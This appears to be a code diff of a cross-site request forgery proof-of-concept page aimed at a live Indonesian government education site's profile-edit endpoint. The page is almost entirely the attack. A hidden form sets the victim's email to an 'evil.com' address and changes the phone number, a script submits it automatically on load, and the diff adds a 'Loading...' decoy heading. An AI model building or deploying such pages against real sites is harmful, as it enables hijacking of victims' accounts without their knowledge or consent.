@@ -1,25 +1,19 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF PoC – Update Phone</title>
+  <title>CSRF PoC – Edit Profil</title>
 </head>
 <body>
 
+<h3>Loading...</h3>
+
 <form action="https://db.ldpi.disdik.padang.go.id/home/editprofil" method="POST">
-  <input type="hidden" name="userid" value="CSRF_BROWSER_888">
-  <input type="hidden" name="password" value="123456">
-  <input type="hidden" name="anak" value="proof">
-  <input type="hidden" name="nik" value="888888">
-  <input type="hidden" name="ibu" value="evil">
-
-  <!-- PARAMETER TARGET -->
   <input type="hidden" name="email" value="browser888@evil.com">
-  <input type="hidden" name="hp" value="081299999999"> <!-- DIUBAH -->
-
+  <input type="hidden" name="hp" value="081299999999">
 </form>
 
 <script>
-  // Auto-submit tanpa interaksi user
   document.forms[0].submit();
 </script>
 
